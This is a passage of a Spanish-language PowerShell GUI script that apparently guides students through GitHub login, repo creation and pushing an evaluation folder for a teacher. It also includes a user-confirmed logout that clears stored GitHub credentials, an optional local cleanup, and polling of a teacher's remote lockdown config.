        # Modo: crear nuevo
        $cmbReposExistentes.Enabled = $false
        $btnRefreshRepos.Enabled = $false
        $txtNombre.Enabled = $true
        $cmbForma.Enabled = $true
        $btnCrearRepo.Text = '1. Crear Repo'
    }
    Update-RepoPreview
}

function Validate-Inputs {
    param([switch]$RequireFolder)

    # Dependencias
    $missing = Test-Dependencies
    if ($missing) {
        $installed = Install-Dependencies -Missing $missing
        if (-not $installed) { return $false }
        # Re-chequear
        $missing = Test-Dependencies
        if ($missing) {
            [System.Windows.Forms.MessageBox]::Show(
                "Aún faltan: $($missing -join ', ').`n`nCerrá y reabre el script.",
                'Reiniciar requerido', 'OK', 'Warning') | Out-Null
            return $false
        }
    }

    # gh auth
    if (-not (Test-GhAuth)) {
        $r = [System.Windows.Forms.MessageBox]::Show(
            "No tienes una sesión de GitHub activa.`n`n¿Quieres iniciar sesión ahora?",
            'Sin sesión', 'YesNo', 'Warning')
        if ($r -eq 'Yes') {
            Log '→ Iniciando sesión con código (sin abrir navegador)' 'Yellow'
            $ok = Start-GitHubDeviceLogin
            if (-not $ok) {
                Log '✗ Inicio de sesión cancelado o fallido.' 'Red'
                return $false
            }
            # Re-chequear
            if (-not (Test-GhAuth)) {
                Log '✗ Sesión aún no detectada. Intenta de nuevo.' 'Red'
                return $false
            }
            Update-SessionPanel
        } else {
            return $false
        }
    }

    # Campos requeridos segun modo
    if ($rbModoExistente.Checked) {
        if (-not $cmbReposExistentes.SelectedItem) {
            [System.Windows.Forms.MessageBox]::Show(
                'Selecciona un repositorio de la lista.',
                'Falta dato', 'OK', 'Warning') | Out-Null
            return $false
        }
    } else {
        if (-not $txtNombre.Text.Trim()) {
            [System.Windows.Forms.MessageBox]::Show('Ingresa tu nombre completo.', 'Falta dato', 'OK', 'Warning') | Out-Null
            return $false
        }
        if (-not $cmbForma.Text.Trim()) {
            [System.Windows.Forms.MessageBox]::Show('Selecciona o escribe la forma de la prueba.', 'Falta dato', 'OK', 'Warning') | Out-Null
            return $false
        }
    }

    if ($RequireFolder) {
        if (-not $txtCarpeta.Text -or -not (Test-Path $txtCarpeta.Text)) {
            [System.Windows.Forms.MessageBox]::Show('Selecciona una carpeta válida con tu evaluación.', 'Falta carpeta', 'OK', 'Warning') | Out-Null
            return $false
        }
    }

    return $true
}

function Invoke-CreateRepo {
    if (-not (Validate-Inputs)) { return $false }
    $repo = Get-RepoName

    # Modo: usar repo existente. Validar + clonar + abrir IDLE.
    if ($rbModoExistente.Checked) {
        Set-Status "Validando repo $repo..."
        Log "→ Modo: repositorio existente '$repo'"
        $null = gh repo view $repo 2>&1
        if ($LASTEXITCODE -ne 0) {
            Log "✗ No se pudo acceder al repo '$repo'." 'Red'
            [System.Windows.Forms.MessageBox]::Show(
                "No se encontró el repositorio '$repo' en tu cuenta.`n`nRefresca la lista o cambia a modo 'Crear repositorio nuevo'.",
                'Repo no accesible', 'OK', 'Warning') | Out-Null
            return $false
        }
        Log "✓ Repo '$repo' encontrado." 'Green'
        # Clonar + setear carpeta + abrir IDLE
        return (Invoke-CloneRepo -RepoName $repo)
    }

    # Modo: crear nuevo (siempre publico para que el profesor pueda ver)
    $visibility = '--public'
    Set-Status "Creando repo $repo..."
    Log "→ Creando repo '$repo' (publico)"

    try {
        $null = gh repo view $repo 2>&1
        if ($LASTEXITCODE -eq 0) {
            Log "Repo '$repo' ya existe en tu cuenta. Lo usaremos." 'Yellow'
            return $true
        }

        $output = gh repo create $repo $visibility --confirm 2>&1
        if ($LASTEXITCODE -eq 0) {
            Log "✓ Repo creado: $output"
            Set-Status "Repo $repo creado."

            $ghUser = (gh api user --jq .login 2>$null).Trim()
            $repoUrl = "https://github.com/$ghUser/$repo"
            $folder = $txtCarpeta.Text

            # Abrir carpeta local en Explorer (si hay carpeta seleccionada)
            if ($folder -and (Test-Path $folder)) {
                try {
                    Start-Process explorer.exe -ArgumentList $folder
                    Log "→ Carpeta abierta en Explorador: $folder"
                } catch {
                    Log "  No se pudo abrir Explorador: $_" 'Yellow'
                }
            }

            # MessageBox confirmatorio con detalles
            $msg = "El repositorio se creo correctamente en GitHub.`n`n" +
                   "Nombre: $repo`n" +
                   "URL: $repoUrl`n"
            if ($folder) {
                $msg += "Carpeta local: $folder`n`n"
                $msg += "PROXIMO PASO: haz clic en 'Subir Archivos' para enviar los archivos al repositorio."
            } else {
                $msg += "`nPROXIMO PASO: selecciona la carpeta de tu evaluacion y haz clic en 'Subir Archivos'."
            }
            [System.Windows.Forms.MessageBox]::Show(
                $msg, 'Repositorio creado correctamente', 'OK', 'Information') | Out-Null

            Update-ButtonStates
            return $true
        } else {
            Log "✗ Error creando repo: $output" 'Red'
            Set-Status 'Error al crear repo.'
            [System.Windows.Forms.MessageBox]::Show("No se pudo crear el repo:`n`n$output", 'Error', 'OK', 'Error') | Out-Null
            return $false
        }
    } catch {
        Log "✗ Excepción: $_" 'Red'
        return $false
    }
}

function Invoke-UploadFiles {
    if (-not (Validate-Inputs -RequireFolder)) { return $false }

    $repo = Get-RepoName
    $folder = $txtCarpeta.Text
    $nombre = $txtNombre.Text.Trim()
    $forma = $cmbForma.Text.Trim()

    # Obtener usuario de gh para construir URL
    $ghUser = (gh api user --jq .login 2>$null).Trim()
    if (-not $ghUser) {
        Log '✗ No se pudo obtener tu usuario de GitHub.' 'Red'
        return $false
    }

    $repoUrl = "https://github.com/$ghUser/$repo.git"

    Set-Status "Subiendo a $repo..."
    Log "→ Carpeta: $folder"
    Log "→ Repo URL: $repoUrl"

    # Validar ownership del .git ANTES de tocar nada
    $ownerCheck = Test-GitOwnership -Folder $folder -CurrentGhUser $ghUser
    switch ($ownerCheck.Status) {
        'OtherUser' {
            Log "✗ La carpeta tiene un .git asociado a '@$($ownerCheck.Owner)' (no a @$ghUser)." 'Red'
            [System.Windows.Forms.MessageBox]::Show(
                "Esta carpeta esta vinculada a la cuenta de GitHub '@$($ownerCheck.Owner)', pero tu sesion actual es '@$ghUser'.`n`n" +
                "Por seguridad, no se permite subir desde esta carpeta. Opciones:`n" +
                "  - Selecciona otra carpeta`n" +
                "  - Cierra sesion y entra con la cuenta '@$($ownerCheck.Owner)'`n" +
                "  - Elimina manualmente la subcarpeta .git de:`n    $folder",
                'Conflicto de cuenta detectado', 'OK', 'Error') | Out-Null
            return $false
        }
        'NotGitHub' {
            $r = [System.Windows.Forms.MessageBox]::Show(
                "Esta carpeta tiene un repositorio git apuntando a:`n$($ownerCheck.Url)`n`n" +
                "No es de GitHub. Si continuas, se eliminara la subcarpeta .git existente y se reinicializara apuntando a tu repo de GitHub.`n`n" +
                "¿Continuar?",
                'Repo no-GitHub detectado', 'YesNo', 'Warning')
            if ($r -ne 'Yes') { return $false }
            Remove-Item (Join-Path $folder '.git') -Recurse -Force -ErrorAction SilentlyContinue
            Log '→ Subcarpeta .git eliminada.' 'Yellow'
        }
        'SameUser' {
            # Si el remote ya apunta al repo destino, perfecto. Si no, reinit.
            $expectedUrl = "https://github.com/$ghUser/$($repo).git"
            if ($ownerCheck.Url -notlike "*$ghUser/$repo*") {
                $r = [System.Windows.Forms.MessageBox]::Show(
                    "Esta carpeta ya tiene un .git de tu cuenta pero apunta a otro repo:`n$($ownerCheck.Url)`n`n" +
                    "Si continuas, se eliminara y se reinicializara apuntando a:`n$expectedUrl`n`n" +
                    "¿Continuar?",
                    'Reinicializar repo local?', 'YesNo', 'Warning')
                if ($r -ne 'Yes') { return $false }
                Remove-Item (Join-Path $folder '.git') -Recurse -Force -ErrorAction SilentlyContinue
                Log '→ Subcarpeta .git eliminada (era de tu cuenta, otro repo).' 'Yellow'
            } else {
                Log "→ .git existente de tu cuenta apunta al repo correcto. Se reutiliza." 'Green'
            }
        }
        'NoRemote' {
            Log '→ Subcarpeta .git sin remote, se elimina para reinicializar.' 'Yellow'
            Remove-Item (Join-Path $folder '.git') -Recurse -Force -ErrorAction SilentlyContinue
        }
        'NoGit' {
            # Caso normal: carpeta limpia
        }
    }

    Push-Location $folder
    try {
        # Init si no es repo (despues de eliminacion eventual)
        if (-not (Test-Path .git)) {
            Log '→ git init'
            git init -b main 2>&1 | ForEach-Object { Log "  $_" }
        }

        # Configurar identidad local del repo (no afecta config global)
        # En modo existente, $nombre puede estar vacio -> usar gh user data
        if (-not $nombre) {
            $userJson = gh api user 2>$null | ConvertFrom-Json
            $nombre = if ($userJson.name) { $userJson.name } else { $userJson.login }
        }
        Log "→ git config user.name = `"$nombre`""
        git config user.name "$nombre" 2>&1 | Out-Null

        $userInfo = gh api user 2>$null | ConvertFrom-Json
        $email = $userInfo.email
        if (-not $email) {
            # Email privado en GitHub → usar formato noreply
            $email = "$($userInfo.id)+$($userInfo.login)@users.noreply.github.com"
            Log "→ git config user.email = `"$email`" (email privado, usando noreply)"
        } else {
            Log "→ git config user.email = `"$email`""
        }
        git config user.email "$email" 2>&1 | Out-Null

        # Configurar remote
        $remotes = git remote 2>$null
        if ($remotes -contains 'origin') {
            Log '→ Actualizando remote origin'
            git remote set-url origin $repoUrl 2>&1 | ForEach-Object { Log "  $_" }
        } else {
            Log '→ Agregando remote origin'
            git remote add origin $repoUrl 2>&1 | ForEach-Object { Log "  $_" }
        }

        # Asegurar branch main
        git branch -M main 2>&1 | Out-Null

        # Add
        Log '→ git add .'
        git add . 2>&1 | ForEach-Object { Log "  $_" }

        # Verificar si hay cambios
        $status = git status --porcelain 2>$null
        if (-not $status) {
            Log '⚠ Sin cambios para commitear (working tree limpio).' 'Yellow'
        } else {
            # Commit
            $msg = if ($forma) {
                "Entrega de evaluación - $nombre ($forma)"
            } else {
                "Entrega de evaluación - $nombre"
            }
            Log "→ git commit -m `"$msg`""
            git commit -m $msg 2>&1 | ForEach-Object { Log "  $_" }
        }

        # Push
        Log '→ git push -u origin main'
        $pushOutput = git push -u origin main 2>&1
        $pushOutput | ForEach-Object { Log "  $_" }

        if ($LASTEXITCODE -eq 0) {
            $script:lastPushSuccess = $true
            $script:lastPushUrl = "https://github.com/$ghUser/$repo"
            Log "✓ Subida completada. Ver en: $($script:lastPushUrl)" 'Cyan'
            Set-Status 'Subida OK. Ahora entrega en el AVA.'
        } else {
            Log '✗ Falló el push.' 'Red'
            Set-Status 'Error en push.'
            $script:lastPushSuccess = $false
        }
    } catch {
        Log "✗ Excepción: $_" 'Red'
        $script:lastPushSuccess = $false
    } finally {
        Pop-Location
    }

    if (-not $script:lastPushSuccess) { return $false }

    # Post-push (ya fuera del directorio): instrucciones AVA + opcion de limpiar
    Show-AvaInstructions -RepoUrl $script:lastPushUrl -Tipo $forma

    # Preguntar si ya termino para eliminar carpeta local
    $rDel = [System.Windows.Forms.MessageBox]::Show(
        "¿Ya terminaste la evaluación y entregaste el enlace en el AVA?`n`n" +
        "Si presionas SÍ, se ELIMINARÁ esta carpeta local:`n  $folder`n`n" +
        "(El repositorio en GitHub se mantiene intacto. Puedes volver a clonarlo si necesitas.)",
        '¿Eliminar carpeta local?', 'YesNo', 'Question')

    if ($rDel -eq 'Yes') {
        # Eliminacion silenciosa: sin segundo popup, solo log discreto.
        Set-Status 'Limpiando...'
        try {
            Remove-Item -LiteralPath $folder -Recurse -Force -ErrorAction Stop
            Log '✓ Carpeta local eliminada.' 'Gray'
            $txtCarpeta.Text = ''
            Update-ButtonStates
            Set-Status 'Listo.'
        } catch {
            # Si hay file lock (ej. IDLE abierto), reintentamos despues de cerrar nada.
            # Sin popup molesto: solo log gris.
            Log "  (no se pudo limpiar la carpeta: $($_.Exception.Message))" 'Gray'
            Set-Status 'Listo.'
        }
    } else {
        Log '→ Carpeta local conservada.' 'Gray'
    }

    return $true
}

# -- Actualizar panel de sesión --
function Update-SessionPanel {
    if (Test-GhAuth) {
        try {
            $userInfo = gh api user 2>$null | ConvertFrom-Json
            $login = $userInfo.login
            $email = if ($userInfo.email) { $userInfo.email } else { "(email privado)" }
            $lblSesionUser.Text = "@$login"
            $lblSesionUser.ForeColor = [System.Drawing.Color]::DarkGreen
            $lblSesionEmail.Text = $email
            $btnLogin.Enabled = $false
            $btnLogout.Enabled = $true
        } catch {
            $lblSesionUser.Text = '(error al consultar)'
            $lblSesionUser.ForeColor = [System.Drawing.Color]::DarkOrange
            $lblSesionEmail.Text = ''
            $btnLogin.Enabled = $true
            $btnLogout.Enabled = $false
        }
    } else {
        $lblSesionUser.Text = 'Sin sesión'
        $lblSesionUser.ForeColor = [System.Drawing.Color]::Gray
        $lblSesionEmail.Text = '(no conectado a GitHub)'
        $btnLogin.Enabled = $true
        $btnLogout.Enabled = $false
    }
    Update-ButtonStates
    [System.Windows.Forms.Application]::DoEvents()
}

# -- Wiring de eventos --
$txtNombre.Add_TextChanged({ Update-RepoPreview; Update-ButtonStates })
$cmbForma.Add_TextChanged({ Update-RepoPreview; Update-ButtonStates })
$cmbForma.Add_SelectedIndexChanged({ Update-RepoPreview; Update-ButtonStates })

# Modo de subida (radio buttons)
$rbModoNuevo.Add_CheckedChanged({
    if ($rbModoNuevo.Checked) { Set-ModoUI; Update-ButtonStates }
})
$rbModoExistente.Add_CheckedChanged({
    if ($rbModoExistente.Checked) { Set-ModoUI; Update-ButtonStates }
})

# Link crear cuenta GitHub
$lnkCrearCuenta.Add_LinkClicked({
    if (Show-CreateAccountDialog) {
        Log '→ Lanzando inicio de sesión...'
        if (Start-GitHubDeviceLogin) {
            Update-SessionPanel
            Update-ButtonStates
        }
    }
})

# Selector de repo existente
$cmbReposExistentes.Add_SelectedIndexChanged({ Update-RepoPreview; Update-ButtonStates })
$btnRefreshRepos.Add_Click({ Load-UserRepos })

$btnBuscar.Add_Click({
    $dlg = New-Object System.Windows.Forms.FolderBrowserDialog
    $dlg.Description = 'Selecciona la carpeta con tu evaluación'
    if ($dlg.ShowDialog() -eq 'OK') {
        $txtCarpeta.Text = $dlg.SelectedPath
        Log "Carpeta seleccionada: $($dlg.SelectedPath)"
        Update-ButtonStates
    }
})

$btnLogin.Add_Click({
    Log '→ Iniciando sesión con código (sin abrir navegador)...'
    if (Start-GitHubDeviceLogin) {
        Update-SessionPanel
    }
})

$btnLogout.Add_Click({
    if (-not (Test-GhAuth)) {
        Update-SessionPanel
        return
    }
    $ghUser = (gh api user --jq .login 2>$null).Trim()
    if (-not $ghUser) { $ghUser = '(desconocido)' }

    $r = [System.Windows.Forms.MessageBox]::Show(
        "Se cerrará la sesión de @$ghUser y se borrarán las credenciales guardadas en este equipo.`n`n¿Confirmas?",
        'Cerrar sesión', 'YesNo', 'Warning')
    if ($r -ne 'Yes') { return }

    Log "→ Cerrando sesión de @$ghUser..."
    Set-Status 'Cerrando sesión...'

    # 1. Logout en gh CLI con --user explicito para evitar prompt interactivo
    $logoutOk = $false
    if ($ghUser -and $ghUser -ne '(desconocido)') {
        $logoutOutput = gh auth logout --hostname github.com --user $ghUser 2>&1
        if ($LASTEXITCODE -eq 0) {
            $logoutOk = $true
            Log "  gh auth logout OK"
        } else {
            Log "  gh auth logout exit $LASTEXITCODE : $logoutOutput" 'Yellow'
        }
    }

    # 2. Fallback: borrar hosts.yml directamente si gh logout fallo o no removio la entrada
    if (-not $logoutOk -or (Test-GhAuth)) {
        Log '  Fallback: borrando hosts.yml directamente...' 'Yellow'
        $hostsFile = Join-Path $env:APPDATA 'GitHub CLI\hosts.yml'
        if (Test-Path $hostsFile) {
            try {
                Remove-Item $hostsFile -Force -ErrorAction Stop
                Log "  hosts.yml borrado: $hostsFile"
            } catch {
                Log "  ✗ No se pudo borrar hosts.yml: $_" 'Red'
            }
        }
    }

    # 3. Limpiar Windows Credential Manager (entradas de github.com)
    try {
        $cmdOutput = cmdkey /list 2>$null
        $targets = @()
        foreach ($line in $cmdOutput) {
            if ($line -match 'Target:\s*(.*github\.com.*)') {
                $targets += $Matches[1].Trim()
            }
        }
        foreach ($t in $targets) {
            cmdkey /delete:$t 2>&1 | Out-Null
            Log "  borrada credencial: $t"
        }
        if (-not $targets) {
            Log '  (no habia credenciales github.com en Credential Manager)'
        }
    } catch {
        Log "  Error con cmdkey: $_" 'Yellow'
    }

    # 4. Limpiar cache del git credential helper
    git credential-cache exit 2>$null | Out-Null

    # 5. Verificacion final
    if (Test-GhAuth) {
        Log '✗ La sesion sigue activa despues de intentar cerrarla.' 'Red'
        [System.Windows.Forms.MessageBox]::Show(
            "No se pudo cerrar la sesion completamente. Intenta:`n" +
            "1. Cerrar este script`n" +
            "2. Abrir PowerShell y ejecutar: gh auth logout`n" +
            "3. Volver a abrir el script",
            'Logout incompleto', 'OK', 'Warning') | Out-Null
    } else {
        Log '✓ Sesion cerrada y credenciales borradas.' 'Green'
        Set-Status 'Sesion cerrada.'
        [System.Windows.Forms.MessageBox]::Show(
            'Sesion cerrada. Ahora puedes iniciar sesion con otra cuenta usando el boton "Iniciar sesion".',
            'Listo', 'OK', 'Information') | Out-Null
    }

    Update-SessionPanel
})

$btnCrearRepo.Add_Click({ [void](Invoke-CreateRepo) })
$btnSubir.Add_Click({ [void](Invoke-UploadFiles) })

# -- CHEQUEO AL INICIO: si hay marker de lockdown previo, mostrarlo inmediatamente --
if (Test-Path $script:cheatMarkerFile) {
    Log '✗ Se detecto un bloqueo previo. Mostrando alerta...' 'Red'
    try {
        $prev = Get-Content $script:cheatMarkerFile -Raw | ConvertFrom-Json
        Show-CheatAlertDialog -RepoName $prev.repo `
                              -FilesCount $prev.count `
                              -FilesNames @($prev.files) `
                              -IsPersistent $true
        # Si llegamos aqui, el profesor desbloqueo. Continuamos al form normal.
    } catch {
        # Marker corrupto: mostrar alerta sin detalles
        Show-CheatAlertDialog -RepoName '(desconocido)' `
                              -FilesCount 0 `
                              -FilesNames @() `
                              -IsPersistent $true
    }
}

# -- Mostrar form --
Log 'Listo. Completa los datos y elige una acción.'
Log 'Tip: usa "Hacer TODO" si es la primera vez.' 'Cyan'

# Chequeo proactivo de dependencias al abrir
$initMissing = Test-Dependencies
if ($initMissing) {
    Log "⚠ Dependencias faltantes detectadas: $($initMissing -join ', ')" 'Yellow'
    Log '  Se te ofrecerá instalarlas la primera vez que uses una acción.' 'Yellow'
} else {
    Log '✓ git y gh detectados.'
    if (Test-GhAuth) {
        Log '✓ Sesión de GitHub activa.'
    } else {
        Log '⚠ Sin sesión de GitHub. Inicia sesión con el botón superior derecho.' 'Yellow'
    }
}

# Llenar panel de sesión con datos actuales (esto tambien llama Update-ButtonStates)
Update-SessionPanel
Update-ButtonStates

# Iniciar polling del config remoto del profesor (cada 30s)
$adminTimer = New-Object System.Windows.Forms.Timer
$adminTimer.Interval = $script:adminPollInterval
$adminTimer.Add_Tick({ Check-AdminConfig })
$adminTimer.Start()
# Primer check inmediato
Check-AdminConfig

[void]$form.ShowDialog()
$adminTimer.Stop()
$adminTimer.Dispose()
